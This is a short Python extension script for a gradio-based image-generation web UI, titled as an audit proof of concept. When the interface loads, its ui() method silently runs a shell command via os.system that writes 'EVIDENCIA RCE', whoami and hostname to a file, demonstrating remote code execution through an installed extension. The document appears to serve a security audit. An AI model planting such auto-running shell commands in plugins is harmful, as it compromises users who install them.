import os
import gradio as gr
from modules import scripts

class Script(scripts.Script):
    def title(self):
        return "Audit PoC Luces"

    def show(self, is_img2img):
        return scripts.AlwaysVisible

    def ui(self, is_img2img):
        # Este código roda quando a interface carrega
        try:
            # Comando que prova quem é o usuário e o nome da máquina
            cmd = "echo '--- EVIDENCIA RCE ---' > audit_result.txt && whoami >> audit_result.txt && hostname >> audit_result.txt"
            os.system(cmd)
        except:
            pass
        return []
